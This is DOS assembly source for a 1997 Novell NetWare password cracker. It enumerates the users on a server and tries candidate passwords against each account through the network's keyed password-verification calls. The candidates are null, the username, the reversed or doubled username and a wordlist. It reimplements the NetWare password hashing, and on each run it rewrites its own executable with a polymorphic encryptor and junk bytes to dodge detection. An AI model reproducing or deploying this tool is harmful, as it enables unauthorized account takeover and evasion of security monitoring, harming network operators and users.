model tiny
.code

extrn	smeg:near		;генератор smeg
extrn	encrypt:near		;процедура криптовки
extrn	smeg_bottom:near	;начало smeg
extrn	smeg_top:near		;конец smeg
extrn	generate_garbage:near	;генератор мусора

.startup
		call	$+3
		pop	si
		add	si,offsubmove-3
		mov	di,sp
		sub	di,800h
		mov	cx,lenmove
		push	di
		cld
		rep	movsb
		retn
offsubmove	equ	$-@startup
submove:	sub	si,offrun
		mov	di,100h
		lea	cx,smeg_top-100h
		rep	movsb
		lea	ax,normalrun
		jmp	ax
lenmove		equ	$-submove
offrun		equ	$-@startup
normalrun:	cmp	si,di
		je	secondcrypt
		mov	ah,34h
		int	21h
		mov	di,es:[bx+0fh]
		mov	ah,51h
		int	21h
		mov	ds,di
		mov	es,bx
		sub	di,bx
		mov	ax,es:[di+16h]
		mov	es,ax
		sub	ax,es:[di+16h]
		xchg	si,ax
		lodsw
		lea	si,secondcrypt[di]
		mov	cx,offset smeg_top-lensecond-100h
wordxor:	add	ax,0
secondmask	=	word ptr $-2
		xor	[si],al
		rol	ax,1
		inc	si
		loop	wordxor
lensecond	equ	$-@startup
secondcrypt:	push	cs
		pop	es
		lea	dx,copyright
		call	print
		lea	dx,myself23h
		mov	ax,2523h
		int	21h
		lea	dx,myself24h
		inc	ax
		int	21h
		call	selfmutation
		mov	si,81h
		mov	cl,[si-1]
		xor	ch,ch
		jcxz	gethelp
		lea	bx,username
		call	storetail
		cmp	bx,di
		je	gethelp
		mov	bp,di
		lea	bx,getkeyrep
		call	storetail
		sub	di,bx
		dec	di
		js	gethelp
		jz	gethelp
		cmp	byte ptr [bx],'-'
		jne	gethelp
		mov	ax,[bx+1]
		sub	ax,'00'
		dec	di
		jz	calcnum
		xchg	ah,al
		aad
		dec	di
		jnz	gethelp
calcnum:	cmp	al,0fh
		ja	gethelp
		mov	switch,al
		lea	bx,filelist
		lea	dx,continue
		push	dx
storetail:	pop	dx
		mov	di,si
		mov	al,' '
		repe	scasb
		lea	si,[di-1]
		mov	di,bx
		jcxz	endchar
		inc	cx
nextchar:	lodsb
		cmp	al,' '
		jbe	endchar
		cmp	al,'a'
		jb	nosmallet
		cmp	al,'z'
		ja	nosmallet
		sub	al,' '
nosmallet:	stosb
		loop	nextchar
endchar:	jmp	dx

errornet:	lea	dx,neterror
		jmp	print
prnerrlst:	lea	dx,errlstfile
		jmp	print
gethelp:	lea	dx,helpme
print:		call	strprint
		lea	dx,crlf
strprint:	mov	ah,9
		int	21h
exit:		retn

continue:	mov	ah,0dch
		int	21h
		or	al,al
		jz	errornet
		cmp	bx,di
		je	noerrlst
		lea	dx,filelist
		mov	ax,3d40h
		int	21h
		jc	prnerrlst
		xchg	bx,ax
		xor	cx,cx
		mov	dx,cx
		mov	ax,4202h
		int	21h
		or	dx,dx
		jnz	closerr
		mov	di,sp
		sub	di,offset filebuff+1024
		cmp	ax,di
closerr:	cmc
		jb	errclose
		mov	len_lstfile,ax
		mov	savelen_lstfile,ax
		push	ax
		mov	ax,4200h
		int	21h
		pop	cx
		lea	dx,filebuff
		mov	ah,3fh
		int	21h
		jc	errclose
		sub	ax,cx
errclose:	pushf
		mov	ah,3eh
		int	21h
		popf
		jc	prnerrlst
noerrlst:	lea	dx,plswait
		call	print
		cmp	byte ptr ds:username,'*'
		jne	noallusers
		mov	endorcont,90h
nextuser:	lea	si,scanbindobjreq
		lea	di,scanbindobjrep
		mov	dx,len_scanbindobjrep
		call	netcall
		jnz	exit
		mov	si,di
		lea	di,lastID
		movsw
		movsw
		lodsw
		lea	di,username
		mov	cl,30h
storenext:	lodsb
		or	al,al
		jz	endobject
		stosb
		loop	storenext
endobject:	mov	bp,di
noallusers:	mov	byte ptr [bp],'$'
		lea	dx,crackuser
		call	print
		mov	byte ptr [bp],0
		mov	ax,bp
		sub	ax,offset username
		mov	len_verifyobjectname,al
		mov	len_idobjectname,al
		mov	cx,ax
		push	ax
		add	ax,len_getobjectIDreq
		mov	getobjectIDreq,ax
		pop	ax
		add	ax,len_verifypswreq
		mov	verifypswreq,ax
		lea	si,username
		lea	di,idobjectname
		push	si cx
		rep	movsb
		pop	cx si
		lea	di,verifyobjectname
		rep	movsb
		lea	si,getobjectIDreq
		lea	di,getobjectIDrep
		mov	dx,len_getobjectIDrep
		call	netcall
		jz	oknet
		jmp	errornet
oknet:		call	nullstore
		test	switch,1
		jz	nousenull
		call	crackpassword
		jz	okcracknear
nousenull:	test	switch,2
		jz	nouseusr
		lea	si,username
		lea	di,psw
		mov	cx,bp
		sub	cx,si
		rep	movsb
		call	crackpassword
okcracknear:	jz	okcrack
nouseusr:	test	switch,4
		jz	nousersu
		call	nullstore
		lea	si,[bp-1]
		std
letternext:	lodsb
		mov	[di],al
		inc	di
		cmp	si,offset username
		jae	letternext
		call	crackpassword
		jz	okcrack
nousersu:	test	switch,8
		jz	nouseusrusr
		call	nullstore
		mov	cl,2
doubleloop:	lea	si,username
charnext:	lodsb
		or	al,al
		jz	charend
		stosb
		jmp	charnext
charend:	loop	doubleloop
nextpsw:	call	crackpassword
		jz	okcrack
nouseusrusr:	call	nullstore
		lea	si,filebuff
off_lstfile	=	word ptr $-2
		mov	cx,0
len_lstfile	=	word ptr $-2
		jcxz	printnotcrk
nextletter:	lodsb
		cmp	al,' '
		jbe	badletter
		cmp	al,'a'
		jb	nosmall	
		cmp	al,'z'
		ja	nosmall
		sub	al,' '
nosmall:	stosb		
		loop	nextletter
		cmp	cl,byte ptr ds:psw
		jne	lastpsw
printnotcrk:	lea	dx,notcracked
		jmp	nokaycrack
badletter:	dec	cx
		jz	printnotcrk
		cmp	byte ptr ds:psw,0
		je	nextletter
lastpsw:	mov	len_lstfile,cx
		mov	off_lstfile,si
		jmp	nextpsw
okcrack:	lea	dx,okcracked
		lea	di,psw
		mov	cx,len_psw
		xor	al,al
		repne	scasb
		mov	byte ptr [di-1],'$'
nokaycrack:	call	print
endorcont	label	byte
		retn
nextbind:	mov	off_lstfile,offset filebuff
		mov	len_lstfile,0
savelen_lstfile	=	word ptr $-2
		jmp	nextuser

;----------------------------
crackpassword:	mov	ah,1
		int	16h
		cmp	al,1bh
		jne	noexit
		cbw
		int	16h
		lea	dx,terminated
printexit:	pop	ax
		jmp	print
noexit:		lea	si,getkeyreq
		lea	di,getkeyrep
		mov	dx,8
		call	netcall
		jnz	exitcrack
		push	di
		lea	bx,ID
		lea	si,psw
		lea	di,encryptpsw
		mov	cl,len_psw
		push	di
		call	codepassword
		pop	si bx
		lea	di,encryptpswkey1
		push	di si
		call	codepassword16
		pop	si
		lea	bx,getkeyrep+4
		lea	di,encryptpswkey2
		call	codepassword16
		mov	di,1fh
		pop	bx
nextxor16:	mov	al,[bx+di]
		xor	[bx+si],al
		inc	si
		dec	di
		and	si,0fh
		jnz	nextxor16
		mov	di,0fh
nextxor8:	mov	al,[bx+si]
		xor	al,[bx+di]
		mov	sendpsw[si],al
		inc	si
		dec	di
		and	si,7
		jnz	nextxor8
		mov	dx,si
		lea	si,verifypswreq
		mov	di,si
		call	netcall
		jz	exitcrack
		cmp	al,-1
		je	notruepsw
		lea	dx,generror
		jmp	printexit

;----------------------------
netcall:	mov	cx,[si]
		inc	cx
		inc	cx
		mov	ax,0f217h
		int	21h
notruepsw:	or	al,al
exitcrack:	retn

;----------------------------
nullstore:	lea	di,psw
		mov	cx,len_psw/2
		xor	ax,ax
		push	di
		rep	stosw
		pop	di
		retn
		
;----------------------------
codepassword16:	mov	cl,10h
codepassword:	mov	ax,[bx]
		mov	word ptr ds:IDcode,ax
		mov	ax,[bx+2]
		mov	word ptr ds:IDcode+2,ax
		push	di si
		cmp	cl,len_psw
		jne	@@2
		add	si,cx
		dec	si
		std
@@1:		lodsb
		or	al,al
		jnz	@@2
		loop	@@1
@@2:		lea	di,buff
		push	cx
		mov	cl,16
		xor	ax,ax
		cld
		rep	stosw
		pop	cx di
@@3:		cmp	cl,32
		jbe	@@5
		push	cx
		mov	cl,32
		lea	bx,buff
		mov	si,di
@@4:		lodsb
		xor	[bx],al
		inc	bx
		loop	@@4
		pop	cx
		mov	di,si
		sub	cl,32
		jmp	@@3
@@5:		xor	bx,bx
		jcxz	@@9
		mov	si,di
@@6:		push	di
		add	di,cx
		cmp	si,di
		pop	di
		jne     @@7
		mov	si,di
		mov	al,tabl1[bx]
		cmp	al,0
		org	$-1
@@7:		lodsb
		xor	buff[bx],al
@@8:		inc	bx
		and	bx,1fh
		jnz	@@6
@@9:		push	bx
		and	bx,3
		mov	al,IDcode[bx]
		pop	bx
		xor	buff[bx],al
		inc	bx
		and	bx,1fh
		jnz	@@9
		pop	di
		xor	al,al
		mov	cl,2
@@10:		push	cx
		xor	ah,ah
		mov	si,ax
		add	si,bx
		and	si,1fh
		mov	dl,buff[si]
		sub	dl,tabl1[bx]
		mov	cl,buff[bx]
		add	cx,ax
		xor	cx,dx
		add	ax,cx
		mov	buff[bx],cl
		pop	cx
		inc	bx
		and	bx,1fh
		jnz	@@10
		loop	@@10
		push	di
		mov	cl,8
		xchg	bx,ax
		rep	stosw
		pop	di
		xchg	si,ax
		mov	cl,4
@@11:		mov	al,buff[si]
		xor	ah,ah
		mov	bx,ax
		mov	al,tabl2[bx]
		mov	bx,si
		shr	bx,1
		jnc	@@12
		shl	ax,cl
@@12:		or	[di+bx],al
		inc	si
		and	si,1fh
		jnz	@@11
		retn

;----------------------------
myself24h:	mov	al,3
		iret

;----------------------------
myself23h:	lea	dx,terminated
		call	print
		stc
		retf	2

;----------------------------
selfmutation:	xor	dl,dl
		mov	ax,3302h
		int	21h
		push	dx
		xor	ah,ah
		int	1Ah
		xchg	dx,ax
		mov	di,1
		and	ax,di
		jnz	exitmut
		mov	cx,[di+2ch-1]
		jcxz	exitmut
		mov	es,cx
nextfind:	dec	di
		scasw
		jnz	nextfind
		scasw
		push	es
		pop	ds
		mov	dx,di
		xchg	cx,ax
		mov	ax,4301h
		int	21h
		jc	exitmutdata
		mov	ax,3d91h
		int	21h
exitmutdata:	push	cs cs
		pop	es ds
		jc	exitmut
		xchg	bx,ax
		mov	ah,40h
		int	21h
		jc	cloself
		xor	ah,ah
		int	1Ah
		mov	secondmask,dx
		lea	si,@startup
		lea	di,smeg_top
		lea	cx,[di-100h]
		push	si cx di
		rep	movsb
		mov	bp,di
		lea	di,smeg_top+lensecond
		mov	cx,offset smeg_top-lensecond-100h
		mov	ax,20cdh
xorbyte:	add	ax,dx
		xor	[di],al
		rol	ax,1
		inc	di
		loop	xorbyte
		pop	dx cx ax
commoncrypt:	lea	di,[bp+2dh]	;рабочая область (2dh-длинa workbuffer'a)
		push	di
		call	smeg
		pop	dx
		mov	cx,[bp.decryptor_size]
		mov	ah,40h
		int	21h		;пишем декриптор
		push	dx
		call    encrypt		;шифруем код
		pop	dx
		mov	cx,[bp.datasize]
		mov	ah,40h
		int	21h		;пишем зашифрованный код
		call	generate_garbage
		mov	ah,40h
		int	21h		;пишем в конец мусор
cloself:	mov	ah,3eh
		int	21h
exitmut:	pop	dx
		mov	ax,3301h
		int	21h
		retn

;----------------------------
tabl1	db	72,147,70,103,152,61,230,141,183,16,122,38,90,185,177,53,107
	db	15,213,112,174,251,173,17,244,71,220,167,236,207,80,192

tabl2	db	7,8,0,8,6,4,14,4,5,12,1,7,11,15,10,8,15,8,12,12,9,4,1,14
	db	4,6,2,4,0,10,11,9,2,15,11,1,13,2,1,9,5,14,7,0,0,2,6,6,0
	db	7,3,8,2,9,3,15,7,15,12,15,6,4,10,0,2,3,10,11,13,8,3,10,1
	db	7,12,15,1,8,9,13,9,1,9,4,14,4,12,5,5,12,8,11,2,3,9,14,7
	db	7,6,9,14,15,12,8,13,1,10,6,14,13,0,7,7,10,0,1,15,5,4,11
	db	7,11,14,12,9,5,13,1,11,13,1,3,5,13,14,6,3,0,11,11,15,3
	db	6,4,9,13,10,3,1,4,9,4,8,3,11,14,5,0,5,2,12,11,13,5,13,5
	db	13,2,13,9,10,12,10,0,11,3,5,3,6,9,5,1,14,14,0,14,8,2,13
	db	2,2,0,4,15,8,5,9,6,8,6,11,10,11,15,0,7,2,8,12,7,3,10,1
	db	4,2,5,15,7,10,12,14,5,9,3,14,7,1,2,14,1,15,4,10,6,12,6
	db	15,4,3,0,12,0,3,6,15,8,7,11,2,13,12,6,10,10,8,13

;----------------------------
copyright	db	0ah
		db	'PasswordCracker 1.04 4 Novell Network.',0dh,0ah
		db	'(c) 1997 by Psychomancer aka Nice,SPS.$'
helpme		db	0ah,'Usage: PswCrack username -switch [pswlist]',0dh,0ah
		db	'where:',0dh,0ah
		db	'username - user name or * 4 all users on current server.',0dh,0ah
		db	'switch   - mode of password checking:',0dh,0ah
		db	"           0 - don't use switch,",0dh,0ah
		db	'           1 - check NULL password,',0dh,0ah
		db	'           2 - check USERNAME as password,',0dh,0ah
		db	'           4 - check EMANRESU as password,',0dh,0ah
		db	'           8 - check USERNAMEUSERNAME as password,',0dh,0ah
		db	'           (may b use combination with adding check code/',0dh,0ah
		db	'           4ex: -3 - check NULL and USERNAME as password).',0dh,0ah
		db	'pswlist  - phile with possible passwords.',0dh,0ah,0ah
		db	'Pls c phile PswCrack.doc 4 full information.',0dh,0ah
		db	'Special tnx 2 Black Baron 4 SMEG v0.3.',0dh,0ah
		db	'Send ur messages 2 me on: 2:454/5.9@FidoNet.$'
neterror	db	7,0ah,"Network user or connection isn't found.$"
errlstfile	db	7,0ah,'Error open password list phile.$'
generror	db	7,0ah,'Access denied or general network error. Cracking is possible detect on server.$'
notcracked	db	'Password is NOT cracked.$'
crackuser	db	0ah,'Cracking password 4 user: '
username	db	31h dup (0)
plswait		db	0ah,'Press ESC 4 exit... Pls wait...$'
crlf		db	0dh,0ah,'$'
terminated	db	'Cracking is terminated by user.$'
okcracked	db	7,'Password: '
psw		db	60h dup (0)
len_psw		equ	$-psw
		db	0
filelist	db	80h dup (0)
switch		db	0

;----------------------------
scanbindobjreq	dw	len_scanbindobjreq	;data length
		db	37h			;scan bindery object
lastID		dd	-1			;last object ID (wild)
		dw	100h			;object type (user) (big-endian)
		db	1			;length of object name
		db	'*'			;object name
len_scanbindobjreq	equ	$-scanbindobjreq-2

getobjectIDreq	dw      ?			;data length
		db	35h			;get object ID
		dw	100h			;object type (user)
len_idobjectname db	?			;length object name
len_getobjectIDreq	equ	$-getobjectIDreq-2
idobjectname	db	30h dup (?)		;object name

getkeyreq	dw	1
		db	17h			;get encryption key

verifypswreq	dw	?
		db	4ah			;keyed verify object password
sendpsw		db	8 dup (?)		;encrypted password
		dw	100h			;object type (user)
len_verifyobjectname db	?			;length of object
len_verifypswreq	equ	$-verifypswreq-2
verifyobjectname db	30h dup (?)		;object name

scanbindobjrep	dd	? 			;object ID
		dw	?			;object type
		db	30h dup (?)		;object name
		db	?			;object flag
		db	?			;object security level
		db	?			;object property flag
len_scanbindobjrep	equ	$-scanbindobjrep

getobjectIDrep:
ID		db	4 dup (?)		;object ID
		dw	?			;object type
		db	30h dup (?)		;object name
len_getobjectIDrep	equ	$-getobjectIDrep

getkeyrep	db	8 dup (?)

encryptpsw	db	10h dup (?)
encryptpswkey1	db	10h dup (?)
encryptpswkey2	db	10h dup (?)
buff		db	20h dup (?)
IDcode		db	4 dup (?)
filebuff	label	byte

workbuffer	struc
datasize	dw	?	; 00 length of data to crypt
sourceptr	dw	?	; 02 pointer to data to crypt
targetptr	dw	?	; 04 pointer of where to put crypted data
		db	?	; 06 reg0 encryption value
		db	?	; 07 reg1 counter register
		db	?	; 08 reg2 temporary storage for data
				;	  to be decrypted
		db	?	; 09 reg3
		db	?	; 0A reg4 (always BP)
		db	?	; 0B reg5
		db	?	; 0C reg6
		db	?	; 0D reg7 pointer register
rng_buffer	dw	?	; 0E used by random number generator
cryptval	db	?	; 10 encryption value
ptr_offsets	dw	?	; 11 XXXX in [bx+XXXX] memory references
loop_top	dw	?	; 13 points to top of decryption loop
pointer_patch	dw	?	; 15 points to initialisation of pointer
counter_patch	dw	?	; 17 points to initialisation of counter
pointer_fixup	dw	?	; 19 needed for pointer calculation
crypt_type	db	?	; 1B how is it encrypted?
initialIP	dw	?	; 1C IP at start of decryptor
lastgarble	db	?	; 1E type of the last garbling instr
cJMP_patch	dw	?	; 1F conditional jmp patch
CALL_patch	dw	?	; 21 CALL patch
nJMP_patch	dw	?	; 23 near JMP patch
garbage_size	dw	?	; 25 # garbage bytes to append
decryptor_size	dw	?	; 27 size of decryptor
last_CALL	dw	?       ; 29 location of an old CALL patch location
which_tbl	dw	?	; 2B which table to use
workbuffer	ends

		end
